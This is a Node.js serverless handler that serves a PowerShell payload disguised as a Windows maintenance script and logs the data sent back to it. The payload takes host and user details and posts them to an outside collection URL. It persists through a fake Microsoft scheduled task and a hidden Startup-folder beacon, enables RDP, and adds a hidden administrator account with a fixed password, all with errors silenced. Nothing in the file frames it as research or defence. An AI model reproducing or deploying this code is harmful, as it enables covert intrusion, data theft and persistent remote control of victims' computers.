// Your existing collect.js - ADD THIS SECTION for payload delivery
module.exports = async (req, res) => {
  console.log('🔔 Request received - Method:', req.method);
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
  const timestamp = new Date().toISOString();
  
  // ========== NEW PAYLOAD DELIVERY SECTION ==========
  if (req.method === 'GET' && req.query.type === 'payload') {
    console.log('📦 Serving stealth payload to:', clientIP);
    
    const stealthPayload = `# Windows System Maintenance Script
try {
    # 1. System information collection (disguised as telemetry)
    $systemData = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        ScanType = 'RoutineSystemMaintenance'
    } | ConvertTo-Json

    # 2. Send system info to your existing collect endpoint
    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='system_info'; data=$systemData} -UseBasicParsing

    # 3. Create persistence via Windows Task Scheduler
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \\"try { \\$result = Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='heartbeat'; computer=\\\$env:COMPUTERNAME; user=\\\$env:USERNAME} -UseBasicParsing; Start-Sleep 300 } catch { Start-Sleep 300 }\\""
    $taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "Microsoft\\\\Windows\\\\SystemMaintenance" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "System maintenance tasks" -RunLevel Highest -Force

    # 4. Enable RDP for remote access
    Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

    # 5. Create admin account for persistence
    net user "SystemSupport" "WinSupport123!" /add /fullname:"Windows System Support" /comment:"System maintenance account" /y 2>$null
    net localgroup administrators "SystemSupport" /add 2>$null

    # 6. Additional persistence via startup folder
    $startupScript = "Set WshShell = CreateObject(\\"WScript.Shell\\")\\nWshShell.Run \\"powershell -WindowStyle Hidden -Command \\\\\\"try { Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='startup_beacon'; computer=\\$env:COMPUTERNAME} -UseBasicParsing } catch { }\\\\\\"\\", 0, False"
    Set-Content -Path "\\$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SystemUtilities.vbs" -Value $startupScript -ErrorAction SilentlyContinue

} catch {
    # Silent error handling - no visible indicators
}`;

    res.setHeader('Content-Type', 'text/plain');
    return res.send(stealthPayload);
  }
  // ========== END PAYLOAD SECTION ==========
  
  // Your existing POST handling code (KEEP THIS PART)
  if (req.method === 'POST') {
    try {
      const systemData = req.body.data || req.body;
      
      console.log('🎯 DATA RECEIVED:');
      console.log('⏰ Time:', timestamp);
      console.log('🌐 IP:', clientIP);
      
      if (systemData.ComputerName) {
        console.log('💻 Computer:', systemData.ComputerName);
        console.log('👤 User:', systemData.UserName);
        console.log('🖥️ OS:', systemData.OS);
        console.log('🏗️ Architecture:', systemData.Architecture);
      } else {
        console.log('📦 Body:', systemData);
      }
      
      console.log('────────────────────────────');

      return res.json({
        status: 'success',
        message: 'Data received',
        timestamp: timestamp
      });
      
    } catch (error) {
      console.error('❌ Error:', error);
      return res.status(500).json({ error: 'Processing failed' });
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' });
};
